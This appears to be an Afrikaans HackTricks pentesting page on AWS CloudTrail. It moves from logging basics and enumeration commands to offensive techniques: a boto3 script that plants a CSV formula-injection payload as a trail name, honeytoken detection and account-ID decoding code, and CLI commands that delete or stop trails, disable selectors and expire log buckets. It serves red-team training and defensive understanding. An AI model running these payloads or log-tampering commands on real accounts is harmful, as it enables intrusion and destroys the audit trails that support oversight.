# AWS - CloudTrail Enum

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## **CloudTrail**

AWS CloudTrail **neem aktiwiteit binne jou AWS-omgewing op en monitor dit**. Dit vang gedetailleerde **gebeurtenislogboeke** op, insluitend wie wat, wanneer en vanwaar gedoen het, vir alle interaksies met AWS-hulpbronne. Dit bied 'n ouditroete van veranderinge en aksies, wat help met sekuriteitsanalise, nakoming van ouditvereistes en opsporing van hulpbronveranderinge. CloudTrail is noodsaaklik vir die verstaan van gebruikers- en hulpbron-gedrag, die verbetering van sekuriteitsposisies en die versekering van regulerende nakoming.

Elke gelogde gebeurtenis bevat:

* Die naam van die opgeroep API: `eventName`
* Die opgeroepde diens: `eventSource`
* Die tyd: `eventTime`
* Die IP-adres: `SourceIPAddress`
* Die agent-metode: `userAgent`. Voorbeelde:
* Signing.amazonaws.com - Vanaf AWS-bestuurskonsol
* console.amazonaws.com - Hoofgebruiker van die rekening
* lambda.amazonaws.com - AWS Lambda
* Die versoekparameters: `requestParameters`
* Die respons-elemente: `responseElements`

Gebeurtenisse word geskryf na 'n nuwe logl√™er **ongeveer elke 5 minute in 'n JSON-l√™er**, dit word deur CloudTrail bewaar en uiteindelik word logl√™ers **ongeveer 15 minute later na S3 afgelewer**.\
CloudTrail-logboeke kan **geaggregeer word oor rekeninge en oor streke**.\
CloudTrail maak dit moontlik om **logl√™erintegriteit te gebruik om te verifieer dat jou logl√™ers onveranderd gebly het** sedert CloudTrail dit aan jou afgelewer het. Dit skep 'n SHA-256-hash van die logboeke binne 'n digest-l√™er. 'n SHA-256-hash van die nuwe logboeke word elke uur geskep.\
Wanneer jy 'n Trail skep, sal die gebeurtenisselekteerders jou in staat stel om die trail aan te dui om te log: Bestuurs-, data- of insiggebeurtenisse.

Logboeke word gestoor in 'n S3-emmer. Standaard word kantversleuteling aan die kant van die bediener gebruik (SSE-S3), sodat AWS die inhoud vir die mense wat toegang daartoe het, sal ontsluit, maar vir addisionele sekuriteit kan jy SSE met KMS en jou eie sleutels gebruik.

Die logboeke word gestoor in 'n **S3-emmer met hierdie naamformaat**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Waar die BucketName is: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Voorbeeld: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Binne elke vouer sal elke logboek 'n **naam volgens hierdie formaat h√™**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Logl√™ernaamkonvensie

![](<../../../../.gitbook/assets/image (29).png>)

Verder sal **digest-l√™ers (om l√™erintegriteit te kontroleer)** binne dieselfde emmer wees in:

![](<../../../../.gitbook/assets/image (22).png>)

### Aggregeer Logboeke van Meerdere Rekeninge

* Skep 'n Trail in die AWS-rekening waar jy wil h√™ dat die logl√™ers afgelewer moet word
* Pas toestemmings toe op die bestemmings-S3-emmer wat kruisrekeningstoegang vir CloudTrail toelaat en elke AWS-rekening wat toegang nodig het, toelaat
* Skep 'n nuwe Trail in die ander AWS-rekeninge en kies om die geskepte emmer in stap 1 te gebruik

Maar selfs al kan jy al die logboeke in dieselfde S3-emmer stoor, kan jy nie CloudTrail-logboeke van verskillende rekeninge saamvoeg in 'n CloudWatch-logboek wat aan 'n enkele AWS-rekening behoort nie.

{% hint style="danger" %}
Onthou dat 'n rekening verskillende Trails van CloudTrail **geaktiveer** kan h√™ wat dieselfde (of verskillende) logboeke in verskillende emmers stoor.
{% endhint %}

### Cloudtrail van alle org-rekeninge in 1

Wanneer jy 'n CloudTrail skep, is dit moontlik om aan te dui om cloudtrail vir al die rekeninge in die organisasie te aktiveer en die logboeke in net 1 emmer te kry:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

Op hierdie manier kan jy CloudTrail maklik konfigureer in al die streke van al die rekeninge en die logboeke in 1 rekening (wat jy moet beskerm) sentraliseer.

### Logl√™er Kontrole

Jy kan nagaan of die logboeke nie gewysig is deur die volgende uit te voer

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs na CloudWatch

**CloudTrail kan outomaties logboeke na CloudWatch stuur sodat jy waarskuwings kan instel wanneer verdagte aktiwiteite uitgevoer word.**\
Let daarop dat 'n **rol** geskep moet word om CloudTrail toe te laat om die logboeke na CloudWatch te stuur. Indien moontlik, word dit aanbeveel om die AWS-standaardrol te gebruik om hierdie aksies uit te voer. Hierdie rol sal CloudTrail in staat stel om die volgende te doen:

* CreateLogStream: Hiermee kan 'n CloudWatch Logs-logstroom geskep word
* PutLogEvents: Lees CloudTrail-logboeke na CloudWatch Logs-logstroom

### Gebeurtenisgeskiedenis

CloudTrail Gebeurtenisgeskiedenis stel jou in staat om in 'n tabel die logboeke wat opgeneem is, te ondersoek:

![](<../../../../.gitbook/assets/image (24).png>)

### Insigte

**CloudTrail Insigte** analiseer outomaties skryfbestuursgebeurtenisse vanaf CloudTrail-roetes en waarsku jou vir **ongewone aktiwiteit**. Byvoorbeeld, as daar 'n toename in `TerminateInstance`-gebeurtenisse is wat verskil van gevestigde basislyne, sal jy dit sien as 'n Insig-gebeurtenis. Hierdie gebeurtenisse maak dit makliker as ooit om **ongewone API-aktiwiteit op te spoor en daarop te reageer**.

Die insigte word in dieselfde emmer as die CloudTrail-logboeke gestoor in: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Sekuriteit

| Integriteit van CloudTrail-logl√™er | <ul><li>Bevestig of logboeke gewysig of uitgevee is</li><li><p>Gebruik digest-l√™ers (skep 'n has vir elke l√™er)</p><ul><li>SHA-256-hashtegniek</li><li>SHA-256 met RSA vir digitale ondertekening</li><li>privaatsleutel in besit van Amazon</li></ul></li><li>Dit neem 1 uur om 'n digest-l√™er te skep (gedoen op die uur elke uur)</li></ul> |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV-inspuiting**

Dit is moontlik om 'n CVS-inspuiting uit te voer binne CloudTrail wat arbitr√™re kode sal uitvoer as die l√™ers uitgevoer word in CVS-formaat en oopgemaak word met Excel.\
Die volgende kode sal 'n loginskrywing genereer met 'n slegte Trail-naam wat die payload bevat:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Vir meer inligting oor CSV-injeksies, besoek die bladsy:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Vir meer inligting oor hierdie spesifieke tegniek, besoek [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Om opsporing te omseil**

### HoneyTokens-omseiling

HoneyTokens word geskep om die uitlek van sensitiewe inligting op te spoor. In die geval van AWS is dit AWS-sleutels waarvan die gebruik gemonitor word. As iets 'n aksie met daardie sleutel veroorsaak, moet iemand daardie sleutel gesteel het.

Hierdie monitering word egter deur CloudTrail uitgevoer, en daar is sommige AWS-diens wat nie logboeke na CloudTrail stuur nie (vind die [lys hier](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Sommige van hierdie dienste sal reageer met 'n fout wat die ARN van die sleutelrol bevat as iemand ongemagtig (die honeytoken-sleutel) probeer om dit te benader.

Op hierdie manier kan 'n aanvaller die ARN van die sleutel verkry sonder om enige logboek te veroorsaak. In die ARN kan die aanvaller die AWS-rekening-ID en die naam sien. Dit is maklik om die rekening-ID's en name van die HoneyToken-maatskappye te ken, sodat 'n aanvaller kan identifiseer of die token 'n HoneyToken is.

![](<../../../../.gitbook/assets/image (65).png>)

#### **HoneyTokens-opsporing**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) spoor op of 'n sleutel behoort aan [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

- As **`canarytokens.org`** in die rol-naam voorkom of die rekening-ID **`534261010715`** in die foutboodskap voorkom.
- Deur hulle onlangs te toets, gebruik hulle die rekening **`717712589309`** en het steeds die string **`canarytokens.com`** in die naam.
- As **`SpaceCrab`** in die rol-naam in die foutboodskap voorkom
- **SpaceSiren** gebruik **uuids** om gebruikersname te genereer: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
- As die **naam soos willekeurig gegenereer lyk**, is daar 'n ho√´ waarskynlikheid dat dit 'n HoneyToken is.

{% hint style="danger" %}
Let daarop dat alle openbare API's wat ontdek is om nie CloudTrail-logboeke te skep nie, nou reggemaak is, so jy moet dalk jou eie vind...

Of jy kan die **Rekening-ID** kry van die **ge√´nkripteerde** binne die toegangssleutel soos [**hier verduidelik**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) en die rekening-ID met jou lys van Honeytokens AWS-rekeninge vergelyk:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

Vir meer inligting, kyk na die [**oorspronklike navorsing**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Toegang tot Derde Infrastruktuur

Sekere AWS-dienste sal **infrastruktuur skep**, soos **Databasisse** of **Kubernetes**-klusters (EKS). 'n Gebruiker wat direk met hierdie dienste kommunikeer (soos die Kubernetes API) **sal nie die AWS API gebruik nie**, dus sal CloudTrail nie hierdie kommunikasie kan sien nie.

Daarom kan 'n gebruiker met toegang tot EKS wat die URL van die EKS API ontdek het, 'n token lokaal genereer en **direk met die API-diens kommunikeer sonder om deur CloudTrail opgespoor te word**.

Meer inligting in:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Wysiging van CloudTrail-konfigurasie

#### Verwyder spore
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Stop spore

Om 'n spoor te stop, kan jy die volgende stappe volg:

1. Navigeer na die **CloudTrail**-diens in die beheerpaneel van jou **AWS**-rekening.
2. Kies die relevante **spoor** wat jy wil stop.
3. Klik op die **Stop spoor**-opsie.
4. Bevestig die aksie deur op die **Stop spoor**-knoppie te klik.

Hierdie sal die spoor stop en verhoed dat verdere aktiwiteit geregistreer word.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Deaktiveer multi-streek logboekhouding

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### Deaktiveer Logboekhouding deur Gebeurtenis Selekteerders

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

In die eerste voorbeeld word 'n enkele gebeurtenisselektor verskaf as 'n JSON-reeks met 'n enkele objek. Die `"ReadWriteType": "ReadOnly"` dui aan dat die **gebeurtenisselektor slegs leesgebeurtenisse moet vasvang** (so CloudTrail-insigte sal byvoorbeeld nie skryfgebeurtenisse nagaan nie).

Jy kan die gebeurtenisselektor aanpas volgens jou spesifieke vereistes.

#### Logverwydering via S3 lewensikluspolicy

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Wysiging van Emmerskonfigurasie

* Verwyder die S3-emmer
* Verander die emmerbeleid om enige skryfaksies van die CloudTrail-diens te weier
* Voeg 'n lewensikluspolicy by die S3-emmer om voorwerpe te verwyder
* Deaktiveer die KMS-sleutel wat gebruik word om die CloudTrail-logboeke te versleutel

### Cloudtrail-ransomware

#### S3-ransomware

Jy kan **'n asimmetriese sleutel genereer** en maak **CloudTrail die data versleutel** met daardie sleutel en **verwyder die privaatsleutel** sodat die CloudTrail-inhoud nie herstel kan word nie.\
Dit is basies 'n **S3-KMS-ransomware** wat verduidelik word in:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS-ransomware**

Dit is 'n makliker manier om die vorige aanval uit te voer met verskillende toestemmingsvereistes:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Verwysings**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
